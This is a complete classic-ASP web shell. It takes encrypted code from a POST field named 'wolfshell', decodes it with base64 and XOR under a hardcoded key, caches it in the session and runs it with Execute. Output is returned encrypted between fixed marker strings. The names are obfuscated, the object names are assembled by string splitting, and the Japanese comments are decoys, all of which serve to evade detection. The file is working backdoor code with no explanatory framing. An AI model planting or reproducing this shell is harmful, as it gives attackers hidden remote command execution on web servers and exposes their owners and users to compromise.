<%
'// 準備はいいか？
Set obj_map_1x = Server.CreateObject(Split("Scripting,Dictionary", ",")(0) & "." & Split("Scripting,Dictionary", ",")(1))

'// 月が綺麗ですね。
Function func_decode_2y(ByVal p_data_in)
    Dim x_obj, x_node
    Set x_obj = CreateObject("Msxml2.DOMDocument.3.0")
    Set x_node = x_obj.CreateElement("base64")
    x_node.dataType = "bin.base64"
    x_node.text = p_data_in
    func_decode_2y = x_node.nodeTypedValue
    Set x_node = Nothing
    Set x_obj = Nothing
End Function

'// この世界の片隅に。
Function func_crypt_3z(p_content, p_is_bin)
    dim s_len, i, s_result, s_key, k_len, o_stream
    s_key = "3c6e0b8a9c15224a"
    k_len = len(s_key)
    Set o_stream = CreateObject("ADODB.Stream")
    o_stream.CharSet = "iso-8859-1"
    o_stream.Type = 2
    o_stream.Open
    '// すべての人間は、生まれながらにして自由であり。
    if IsArray(p_content) then
        s_len=UBound(p_content)+1
        For i=1 To s_len
            o_stream.WriteText chrw(ascb(midb(p_content,i,1)) Xor Asc(Mid(s_key,(i mod k_len)+1,1)))
        Next
    end if
    o_stream.Position = 0
    if p_is_bin then
        o_stream.Type = 1
        func_crypt_3z=o_stream.Read()
    else
        func_crypt_3z=o_stream.ReadText()
    end if
End Function
    '// 始めましょう。
    var_key_str="3c6e0b8a9c15224a"
    var_req_data=request.Form("wolfshell")
    if not IsEmpty(var_req_data) then
        '// 夢の中みたい。
        if  IsEmpty(Session("p_data_1")) then
            var_req_data=func_crypt_3z(func_decode_2y(var_req_data),false)
            Session("p_data_1")=var_req_data
            response.End
        else
            '// 終わりだ。
            var_req_data=func_crypt_3z(func_decode_2y(var_req_data),true)
            obj_map_1x.Add "p_data_1",Session("p_data_1")
            Execute(obj_map_1x("p_data_1"))
            var_res_data=run(var_req_data)
            response.Write("a71ab1")
            if not IsEmpty(var_res_data) then
                response.Write Base64Encode(func_crypt_3z(var_res_data,true))
            end if
            response.Write("4b8259")
        end if
    end if
%>